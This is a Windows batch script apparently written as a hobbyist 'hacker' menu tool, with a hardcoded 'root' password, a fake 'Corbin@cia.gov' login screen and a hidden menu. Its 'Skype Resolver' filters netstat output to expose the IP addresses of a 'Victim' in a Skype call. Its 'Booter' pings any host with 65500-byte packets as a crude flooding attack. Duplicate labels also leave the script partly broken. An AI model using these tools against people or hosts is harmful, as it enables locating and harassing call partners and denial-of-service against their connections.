@echo off
title Welcome %computername%
:login
cls
color A
set /p login=  Password : 
IF '%login%' == 'root' GOTO main_menu
IF not '%login%' == 'root' goto loginwrong
:loginwrong
echo You Have Submitted An Invalid Password Press Any Key To Try Again
pause > nul
goto login
:main_menu
cls
color B
echo :::::::::::::::::::::
echo ::    Main Menu    ::
echo :::::::::::::::::::::
echo.
echo  [00] Main Menu
echo  [01] Pinger
echo  [02] Notepad
echo  [03] Open CMD
echo  [04] Skype Resolver
echo  [05] Log Out
set /p var=Command : 
IF '%var%' == '00' GOTO main_menu
IF '%var%' == '01' GOTO pinger
IF '%var%' == '02' GOTO note
IF '%var%' == '03' GOTO cmd
IF '%var%' == '04' GOTO skype
IF '%var%' == '05' GOTO logoff
IF '%var%' == '-[' GOTO connect
goto main_menu
:connect
cls
color 1
echo Press Any Key To Login To Corbin@cia.gov
pause > nul
goto hide
:logoff
set /p LOC=msg Are you sure yo want to logg off? (Y/N)
IF '%LOC%' == 'N' GOTO back
IF '%LOC%' == 'Y' GOTO end
IF '%LOC%' == 'n' GOTO back
IF '%LOC%' == 'y' GOTO end
pause
goto main_menu

:skype
set param=%~1

::When 0, it will act as an improved version of Netstat.
::When 1, it will grab Skype IP's.
set skype=1

setlocal enabledelayedexpansion

::Used to convert PID to process names.
for /f "tokens=1 delims=" %%A in ('tasklist') do call :PID %%A
echo.
echo Skype Resolver (Must Be sending a File Or In a Call With Victim)
echo.
echo [Program:PID] LocalIP:Port - RemoteIP:Port
echo.
for /f "tokens=1-27 delims=: " %%A in ('netstat -ano') do call :netstat %%A %%B %%C %%D %%E %%F %%G %%H %%I %%J %%K %%L %%M %%N %%O %%P %%Q %%R %%S %%T %%U
if "%param%"=="-log" exit /b
echo.
echo Skype Resolve's Complete Press Any Key To Rever To The Main Menu
pause>nul
goto main_menu

:PID
set pid_%2=%1
exit /b

:netstat
set type=%1
set srcIP=%2
set srcPort=%3
set dstIP=%4
set dstPort=%5
set state=%6
set pid=%7
set name=!pid_%pid%!

::Filter local connections away.
if "%state%"=="" exit /b
if not "%type%"=="TCP" exit /b
if "%srcIP%"=="Local" exit /b
if "%dstIP%"=="*" exit /b
if "%srcIP%"=="%dstIP%" exit /b
if "%pid%"=="" exit /b

if "%dstPort%"=="[" (
set state=LISTENING
set srcPort=%dstIP%
set pid=%9
)
if "%dstPort%"=="[" set name=!pid_%pid%!

if "%name%"=="" set name=Unknown

::Skype filter
if "%skype%"=="1" (
if /I not "%name%"=="skype.exe" exit /b
if not "%state%"=="ESTABLISHED" exit /b
if "%dstPort%"=="443" exit /b
if "%dstPort%"=="12350" exit /b)

::Formatting \tabs
set srcPortTab= %srcPort%
set namePidTab=[%name%:%pid%] 
set srcIpPortTab=%srcIP%:%srcPort% 
set dstIpPortTab=%dstIP%:%dstPort% 
set stateTab=%state% 
set namePidTab=%namePidTab:~0,20%
set srcIpPortTab=%srcIpPortTab:~0,21%
set dstIpPortTab=%dstIpPortTab:~0,21%
set stateTab=%stateTab:~0,12%
set srcPortTab=%srcPortTab:~-5%

if not "%state%"=="LISTENING" echo.%namePidTab% %srcIPPortTab% %dstIPPortTab% %stateTab%
if "%state%"=="LISTENING" echo.%namePidTab% Listening on: %srcPortTab%
exit /b


:back
goto main_menu

:::::::::::::::::::::::::::::
::::::::PING FUNCTION::::::::
:::::::::::::::::::::::::::::
:pinger
cls
color B
echo  ::::::::::::::::::::::::::::
echo  :: Online/Offline Checker ::  
echo  ::::::::::::::::::::::::::::
set /p host="HOST>"
set /p pings="PINGS>"
set /p bytes="BYTES>"
goto ping1
:ping1
ping %host% -l %bytes% -n %pings%
echo Press Any Key to Continue...
pause > nul
goto main_menu

:::::::::::::::::::::::::::::
:::::::::::NOTEPAD:::::::::::
:::::::::::::::::::::::::::::
:note
start %SystemRoot%\system32\notepad.exe
goto main_menu

:::::::::::::::::::::::::::::
:::::::::::::CMD:::::::::::::
:::::::::::::::::::::::::::::
:cmd
start %SystemRoot%\System32\cmd.exe
goto main_menu
PAUSE
cls

:::::::::::::::::::::::::::::
:::::::::Hidden Menu:::::::::
:::::::::::::::::::::::::::::
:hide
cls
color A
echo :::::::::::::::::::::
echo :::::Secret Menu:::::
echo :::::::::::::::::::::
echo.
echo  [00] Logout
echo  [01] Booter
set /p var=Command : 
IF '%var%' == '00' GOTO main_menu
IF '%var%' == '01' GOTO booter
goto hide
:booter
:pinger
cls
color B
echo  ::::::::::::::::::::::::::::
echo  :: Online/Offline Checker ::  
echo  ::::::::::::::::::::::::::::
set /p host="HOST>"
set /p pings="PACKETS>"
goto ping1
:ping1
ping %host% -l 65500 -n %pings%
echo Press Any Key to Continue...
pause > nul
goto main_menu

:end